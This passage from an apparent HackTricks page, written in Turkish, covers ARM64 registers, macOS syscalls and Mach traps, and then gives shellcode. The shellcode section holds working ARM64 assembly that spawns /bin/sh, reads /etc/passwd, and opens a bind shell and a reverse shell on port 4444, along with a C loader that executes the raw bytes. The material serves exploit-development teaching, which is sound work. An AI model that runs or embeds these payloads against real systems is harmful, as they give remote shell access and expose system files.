- **`Q`** bayrağı: Özel doyurucu aritmetik komutun yürütülmesi sırasında **tamsayı doygunluğu oluştuğunda** 1 olarak ayarlanır. Bir kez **`1`** olarak ayarlandığında, elle 0'a ayarlanana kadar değeri korur. Ayrıca, değerini örtük olarak kontrol eden herhangi bir komut yoktur, değeri manuel olarak okunarak kontrol edilmelidir.
- **`GE`** (Büyük veya eşit) Bayraklar: SIMD (Tek Komutla, Çoklu Veri) işlemlerinde kullanılır, örneğin "paralel toplama" ve "paralel çıkarma". Bu işlemler, bir komutta birden fazla veri noktasının işlenmesine izin verir.

Örneğin, **`UADD8`** komutu, paralel olarak dört çift baytı (iki 32 bitlik işlemden) toplar ve sonuçları bir 32 bitlik kayıtta depolar. Ardından, bu sonuçlara dayanarak **`APSR`** içindeki **`GE`** bayraklarını ayarlar. Her GE bayrağı, bayt çiftlerinden biri için eklemenin taşması durumunda eklemenin taştığını gösterir.

**`SEL`** komutu, bu GE bayraklarını koşullu işlemler yapmak için kullanır.

#### Yürütme Durumu Kayıtları

- **`J`** ve **`T`** bitleri: **`J`** 0 olmalıdır ve **`T`** 0 ise A32 komut seti kullanılır, 1 ise T32 kullanılır.
- **IT Blok Durum Kaydı** (`ITSTATE`): Bunlar 10-15 ve 25-26'dan gelen bitlerdir. Bir **`IT`** ön ekli grup içindeki komutlar için koşulları depolarlar.
- **`E`** biti: **endianness**'ı belirtir.
- **Mod ve İstisna Maske Bitleri** (0-4): Mevcut yürütme durumunu belirler. **5.** si programın 32 bit (1) veya 64 bit (0) olarak çalıştığını belirtir. Diğer 4'ü, kullanılan **mevcut özel durumunu** belirtir (bir istisna oluştuğunda ve işlendiğinde). Sayı seti, bu işlenirken başka bir istisna tetiklenirse **mevcut önceliği belirtir**.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Belirli istisnalar, **`A`**, `I`, `F` bitleri kullanılarak devre dışı bırakılabilir. **`A`** 1 ise **zaman uyumsuz hatalar** tetiklenecektir. **`I`**, harici donanım **Kesme İsteklerine** (IRQ'ler) yanıt vermek için yapılandırılır ve F, **Hızlı Kesme İstekleri** (FIR'ler) ile ilgilidir.

## macOS

### BSD sistem çağrıları

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)'a göz atın. BSD sistem çağrıları **x16 > 0** olacaktır.

### Mach Tuzakları

[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)'ya göz atın. Mach tuzakları **x16 < 0** olacaktır, bu nedenle önceki listedeki numaraları eksi işaretiyle çağırmanız gerekecektir: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.

Bu (ve BSD) sistem çağrılarını nasıl çağıracağınızı bulmak için bir ayıklama aracında **`libsystem_kernel.dylib`**'i de kontrol edebilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Bazen, birkaç sistem çağrısının (BSD ve Mach) kodu betikler aracılığıyla oluşturulduğundan (kaynak kodundaki yorumlara bakın) **`libsystem_kernel.dylib`**'den **decompile** edilmiş kodu kontrol etmek kaynak kodunu kontrol etmekten daha kolay olabilir çünkü dylib içinde neyin çağrıldığını bulabilirsiniz.
{% endhint %}

### Shellcode'lar

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Bytes'ı çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<detaylar>

<özet>C kodu shellcode'u test etmek için</özet>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
#### Kabuk

[**buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.

{% tabs %}
{% tab title="adr ile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="yığınla" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### Cat ile oku

Amacımız `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmak, bu yüzden ikinci argüman (x1) parametrelerin bir dizisi olmalıdır (bellekte bu adreslerin bir yığını anlamına gelir).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Ana işlem öldürülmezken bir çataldan sh ile komut çağırma
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bağlama kabuğu

Bağlama kabuğu [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) adresinden **4444 numaralı bağlantı noktası** ile.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Ters kabuk

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) adresinden **127.0.0.1:4444**'e revshell'i alın.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
